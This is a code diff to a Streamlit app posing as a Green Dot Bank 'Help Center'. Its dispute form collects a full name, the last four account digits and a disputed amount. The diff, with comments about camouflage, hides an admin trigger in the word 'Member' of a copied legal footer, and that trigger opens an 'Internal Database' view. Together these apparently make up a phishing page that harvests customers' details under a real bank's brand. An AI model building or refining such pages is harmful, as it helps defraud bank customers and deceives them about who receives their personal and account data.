@@ -69,18 +69,26 @@ st.markdown("""<style>
     .legal-footer {
         font-size: 10px; color: #555; text-align: justify; margin-top: 40px;
         border-top: 1px solid #222; padding-top: 20px; line-height: 1.6;
+        display: inline-block;
     }
-    /* Escondemos el botón de trigger y lo hacemos parecer texto */
+    /* Mimetizamos el botón 'Member' para que sea indistinguible del texto */
     div[data-testid="stButton"] button:has(div:contains("Member")) {
         background: transparent !important;
         border: none !important;
-        color: inherit !important;
+        color: #555 !important;
         padding: 0 !important;
+        margin: 0 !important;
         display: inline !important;
         vertical-align: baseline !important;
-        font-size: inherit !important;
+        font-size: 10px !important;
         font-family: inherit !important;
         cursor: default !important;
+        min-height: 0 !important;
+        line-height: 1.6 !important;
+        width: auto !important;
+    }
+    div[data-testid="stButton"] button:has(div:contains("Member")):hover {
+        color: #555 !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -95,7 +103,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("dispute_form_v26", clear_on_submit=True):
+    with st.form("dispute_form_v27", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -131,12 +139,15 @@ if not st.session_state.admin_mode:
         </div>
     </div>""", unsafe_allow_html=True)
 
-    # Footer con link oculto en la palabra 'Member'
-    st.write("""<div class='legal-footer'>
-        Green Dot® cards are issued by Green Dot Bank, """, unsafe_allow_html=True)
-    if st.button("Member", key="admin_trigger"): 
-        st.session_state.admin_mode = True
-    st.write(""" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>""", unsafe_allow_html=True)
+    # Footer mimetizado con el trigger en 'Member'
+    footer_col1, footer_col2, footer_col3 = st.columns([0.48, 0.08, 0.44])
+    with footer_col1:
+        st.markdown("<div class='legal-footer' style='border:none; margin-top:0; padding-top:0;'>Green Dot® cards are issued by Green Dot Bank,</div>", unsafe_allow_html=True)
+    with footer_col2:
+        if st.button("Member", key="admin_trigger"):
+            st.session_state.admin_mode = True
+    with footer_col3:
+        st.markdown("<div class='legal-footer' style='border:none; margin-top:0; padding-top:0; border-top:none;'>FDIC. ©2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
 
 else:
     st.title("🔐 Internal Database")
